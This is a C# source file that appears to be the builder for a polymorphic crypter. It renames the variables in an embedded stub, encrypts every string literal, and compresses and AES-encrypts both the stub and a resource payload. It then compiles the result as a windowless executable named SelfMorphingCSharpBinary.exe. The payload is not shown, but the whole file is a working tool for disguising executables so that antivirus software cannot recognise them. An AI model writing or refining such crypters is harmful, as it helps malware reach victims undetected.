using Build.Properties;
using System;
using System.CodeDom.Compiler;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Build
{
	public static class Program
	{
		private static Random Random = new Random(Environment.TickCount);
		private static string ObfuscationCharacters = "각갂갃간갅갆갇갈갉갊갋갌갍갎갏감갑값갓갔강갖갗갘같갚갛개객갞갟갠갡갢갣갤갥갦갧갨갩갪갫갬갭갮갯";

		public static void Main(string[] args)
		{
			CodeDomProvider compiler = CodeDomProvider.CreateProvider("CSharp");
			string outputAssembly = Path.Combine(Application.StartupPath, GetVariableName() + ".exe");

			CompilerParameters parameters = new CompilerParameters
			{
				GenerateExecutable = true,
				GenerateInMemory = true,
				OutputAssembly = outputAssembly,
				CompilerOptions = "/target:winexe /platform:x86"
			};

			parameters.ReferencedAssemblies.Add("mscorlib.dll");
			parameters.ReferencedAssemblies.Add("System.dll");
			parameters.ReferencedAssemblies.Add("System.Core.dll");
			parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");

			string stubCode = string.Join("\r\n", Resources.Stub.Replace("\r\n", "\n").Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries));

			while (stubCode.Contains("_V_"))
			{
				string variableName = new string(stubCode.Substring(stubCode.IndexOf("_V_")).TakeWhile(ch => "abcdefghijklmnopqrstuvwxyz0123456789_".Contains(char.ToLower(ch))).ToArray());
				stubCode = stubCode.Replace(variableName, variableName == "_V_DecryptString" ? "_@_DecryptString" : "_@_" + GetCleanVariableName());
			}
			stubCode = stubCode.Replace("_@_", "_V_");

			stubCode = stubCode.Replace("_CONST_EncryptedStubCode", "new byte[]{" + string.Join(",", Encrypt(Compress(Encoding.UTF8.GetBytes(stubCode))).Select(_V_Main_Byte2 => _V_Main_Byte2.ToString())) + "}");
			stubCode = stubCode.Replace("_CONST_EncryptedPayload", "new byte[]{" + string.Join(",", Encrypt(Compress(Resources.Payload)).Select(_V_Main_Byte2 => _V_Main_Byte2.ToString())) + "}");

			while (stubCode.Contains("\""))
			{
				int start = stubCode.IndexOf('"');
				string stringLiteral = stubCode.Substring(start, stubCode.IndexOf('"', start + 1) - start + 1);
				stubCode = stubCode.Replace(stringLiteral, "_V_DecryptString(@" + EncryptString(stringLiteral.Substring(1, stringLiteral.Length - 2)) + "@)");
			}
			while (stubCode.Contains("_V_"))
			{
				stubCode = stubCode.Replace(new string(stubCode.Substring(stubCode.IndexOf("_V_")).TakeWhile(ch => "abcdefghijklmnopqrstuvwxyz0123456789_".Contains(char.ToLower(ch))).ToArray()), GetVariableName());
			}
			stubCode = stubCode.Replace('@', '"');

			File.WriteAllText("Debug_SelfMorphingCSharpBinary.cs", stubCode);

			compiler.CompileAssemblyFromSource(parameters, stubCode);
			string destinationAssembly = "SelfMorphingCSharpBinary.exe";
			File.Delete(destinationAssembly);
			File.Move(outputAssembly, destinationAssembly);
		}

		private static byte[] Compress(byte[] data)
		{
			MemoryStream memoryStream = new MemoryStream();
			GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, true);
			gzipStream.Write(data, 0, data.Length);
			gzipStream.Close();
			memoryStream.Position = 0;
			byte[] compressedData = new byte[memoryStream.Length];
			memoryStream.Read(compressedData, 0, compressedData.Length);
			byte[] compressedBuffer = new byte[compressedData.Length + 4];
			Buffer.BlockCopy(compressedData, 0, compressedBuffer, 4, compressedData.Length);
			Buffer.BlockCopy(BitConverter.GetBytes(data.Length), 0, compressedBuffer, 0, 4);
			return compressedBuffer;
		}
		private static byte[] Encrypt(byte[] data)
		{
			Aes aes = Aes.Create();
			aes.GenerateIV();
			aes.Key = aes.IV;
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(aes.Key, 0, 16);
			CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(data, 0, data.Length);
			cryptoStream.Close();
			return memoryStream.ToArray();
		}
		private static string EncryptString(string str)
		{
			int key = Random.Next(256);
			return (char)(key + 42784) + new string(str.Select(ch => (char)((ch ^ key) + 42784)).ToArray());
		}
		private static string GetVariableName()
		{
			return new string(Enumerable.Range(0, Random.Next(5, 15)).Select(i => ObfuscationCharacters[Random.Next(ObfuscationCharacters.Length)]).ToArray());
		}
		private static string GetCleanVariableName()
		{
			const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890_";
			return new string(Enumerable.Range(0, Random.Next(5, 15)).Select(i => chars[Random.Next(chars.Length)]).ToArray());
		}
	}
}